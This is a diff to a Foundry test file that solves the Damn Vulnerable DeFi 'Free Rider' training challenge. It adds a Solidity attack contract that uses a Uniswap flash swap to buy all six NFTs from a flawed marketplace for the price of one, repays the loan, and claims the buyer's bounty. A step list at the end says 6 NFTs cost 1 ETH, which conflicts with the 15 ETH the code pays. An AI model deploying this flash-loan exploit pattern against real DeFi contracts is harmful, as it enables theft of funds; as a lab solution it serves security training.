@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -134,9 +135,13 @@ contract FreeRider is Test {
         /**
          * EXPLOIT START *
          */
-        vm.startPrank(attacker, attacker);
+        vm.startBroadcast(attacker);
+        console.log("Number of NTFs owned by the market place is : ",freeRiderNFTMarketplace.amountOfOffers());
+        
+        AttackContract attackContract = new AttackContract(freeRiderBuyer, freeRiderNFTMarketplace, dvt, damnValuableNFT, uniswapV2Pair, uniswapV2Factory, uniswapV2Router, attacker, weth);
+        attackContract.attack();
 
-        vm.stopPrank();
+        vm.stopBroadcast();
         /**
          * EXPLOIT END *
          */
@@ -166,3 +171,98 @@ contract FreeRider is Test {
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
 }
+
+contract AttackContract is IERC721Receiver {
+
+
+    FreeRiderBuyer internal freeRiderBuyer;
+    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
+    DamnValuableToken internal dvt;
+    DamnValuableNFT internal damnValuableNFT;
+    IUniswapV2Pair internal uniswapV2Pair;
+    IUniswapV2Factory internal uniswapV2Factory;
+    IUniswapV2Router02 internal uniswapV2Router;
+    address attacker; 
+    WETH9 weth;
+
+    constructor (
+        FreeRiderBuyer _freeRiderBuyer, 
+        FreeRiderNFTMarketplace _freeRiderNFTMarketplace, 
+        DamnValuableToken _dvt, 
+        DamnValuableNFT _damnValuableNFT, 
+        IUniswapV2Pair _uniswapV2Pair,
+        IUniswapV2Factory _uniswapV2Factory,
+        IUniswapV2Router02 _uniswapV2Router, address _attacker, WETH9 _weth
+    ) {
+        freeRiderBuyer = _freeRiderBuyer;
+        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
+        dvt = _dvt;
+        damnValuableNFT = _damnValuableNFT;
+        uniswapV2Pair = _uniswapV2Pair;
+        uniswapV2Factory = _uniswapV2Factory;
+        uniswapV2Router = _uniswapV2Router;
+        attacker = _attacker;
+        weth = _weth;
+    }
+    function attack () public {
+        bytes memory data = abi.encode(15);
+        uniswapV2Pair.swap(0, 15 ether ,address(this),data );
+}
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+        //Be sure that it's called by the uniswapV2Pair
+        require(msg.sender == address(uniswapV2Pair), "It has to be called by uniswapV2 pair contract");
+        weth.withdraw(15 ether);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i=0; i< tokenIds.length; i++) {
+            tokenIds[i] = i;
+        }
+
+        freeRiderNFTMarketplace.buyMany{value : 15 ether}(tokenIds);
+        uint256 amountToPayBack = 15 ether * 103 / 100;
+
+        weth.deposit{value : amountToPayBack}();
+        weth.transfer(address(uniswapV2Pair),amountToPayBack);
+
+        bytes memory transfertData = abi.encode(attacker);
+        console.log("Number of NTFs owned by the market place is : ",freeRiderNFTMarketplace.amountOfOffers());
+        for (uint256 i = 0; i< tokenIds.length ; i++) {
+            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i, transfertData);
+
+
+        }
+
+        
+
+        
+
+    }
+
+//This help the attackerContract hendle ERC721
+    function onERC721Received(
+    address operator,
+    address from,
+    uint256 tokenId,
+    bytes calldata data
+) external override returns (bytes4) {
+    return this.onERC721Received.selector;
+}
+
+
+    receive () external payable {}
+    
+}
+
+/*
+1. Request a flashSwap of 15 WETH from Uniswap Pair 
+
+2. Unwrap WETH to native ETH
+
+3. Buy 6 NFTS for only 1 ETH 
+
+4. Pay back 15 WETH + 0.3% fees 
+
+5. Send NFTs to recover contract
+
+*/
